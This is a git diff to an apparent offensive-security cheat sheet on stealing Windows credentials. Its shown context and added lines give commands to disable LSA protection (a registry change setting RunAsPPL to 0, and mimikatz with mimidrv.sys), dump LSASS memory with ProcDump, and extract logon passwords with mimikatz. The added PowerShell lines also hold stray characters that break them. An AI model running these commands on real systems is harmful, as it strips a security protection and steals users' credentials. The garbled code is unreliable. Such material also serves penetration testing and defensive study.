@@ -122,8 +122,11 @@ Set-ItemProperty -Path hklm:\SYSTEM\CurrentControlSet\Control\SecurityProviders\
 
 Check if PPL is running with powershell
 
-```powershell
-(Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").RunAsPPL
+```powershellz`
+(Get-ItemProperty -Path "HKLM:\SYSTEM\Curz`rentControlSet\Control\Lsa").RunAsPPL
+
+Disable PPL
+Set-ItemProperty -Path hklm:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 0
 ```
 
 **Disable PPL with mimikatz and mimidrv.sys**
@@ -146,10 +149,17 @@ IF GUI ACCESS:
 3) Load LSASS dump into Mimikatz memory: sekurlsa::minidump lsass.dmp
 4) sekurlsa::logonpasswords
 
+<br><br>
 NO GUI ACCESS:
 
 **Alternatively, we can create the dump file from the command line with ProcDump from SysInternals.**
 
 Custom dump memory lsass file:
 procdump -ma lsass.exe lsass_dump.dmp
+
+<br><br>
+
+### Custom memory dump with C#
+
+
 
